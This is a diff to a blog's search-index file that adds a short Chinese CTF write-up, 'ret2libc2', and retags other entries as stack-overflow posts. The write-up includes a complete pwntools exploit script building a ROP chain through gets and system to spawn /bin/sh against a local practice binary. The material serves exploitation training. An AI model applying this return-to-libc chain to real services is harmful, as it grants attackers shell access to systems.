@@ -4,6 +4,31 @@
   
     
     <entry>
+      <title>ret2libc2</title>
+      <link href="/2022/01/12/ret2libc2/"/>
+      <url>/2022/01/12/ret2libc2/</url>
+      
+        <content type="html"><![CDATA[<ul><li><p>首先checksec一下</p><img src="/2022/01/12/ret2libc2/checksec.png" alt="image-20220112074054848" style="zoom:80%;"></li><li><p>然后运行程序</p><img src="/2022/01/12/ret2libc2/run.png" alt="image-20220112074208851" style="zoom:80%;"></li><li><p>拖入ida查看</p><p>有system无bin/sh</p></li><li><p>写exp</p>   <pre class="line-numbers language-none"><code class="language-none">1 from pwn import *                                                            2 log_level = 'debug' 3 elf = ELF("./ret2libc2") 4 local = 1 5   6 if local: 7     r = process("./ret2libc2") 8 else: 9     r = remote("")10 gets_plt = 0x0804846011 system_plt = 0x0804849012 system_addr = 0x0804864113 pop_ebx = 0x0804843d14  15 buf2_addr = 0x0804A08016  17 payload = b'a'*112 +p32(gets_plt)+p32(pop_ebx) + p32(buf2_addr)+ p32(system_    plt)+p32(0) + p32(buf2_addr)18  19 r.sendline(payload)20 r.sendline("/bin/sh")21  22 r.interactive()                                                     <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul>]]></content>
+      
+      
+      <categories>
+          
+          <category> pwn </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 栈溢出 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>ret2libc1</title>
       <link href="/2022/01/11/ret2libc1/"/>
       <url>/2022/01/11/ret2libc1/</url>
@@ -20,9 +45,7 @@
       
         <tags>
             
-            <tag> pwn </tag>
-            
-            <tag> 二进制 </tag>
+            <tag> 栈溢出 </tag>
             
         </tags>
       
@@ -47,9 +70,7 @@
       
         <tags>
             
-            <tag> pwn </tag>
-            
-            <tag> 二进制 </tag>
+            <tag> 栈溢出 </tag>
             
         </tags>
       
@@ -74,9 +95,7 @@
       
         <tags>
             
-            <tag> pwn </tag>
-            
-            <tag> 二进制 </tag>
+            <tag> 栈溢出 </tag>
             
         </tags>
       
@@ -101,9 +120,7 @@
       
         <tags>
             
-            <tag> pwn </tag>
-            
-            <tag> 二进制 </tag>
+            <tag> 栈溢出 </tag>
             
         </tags>
       
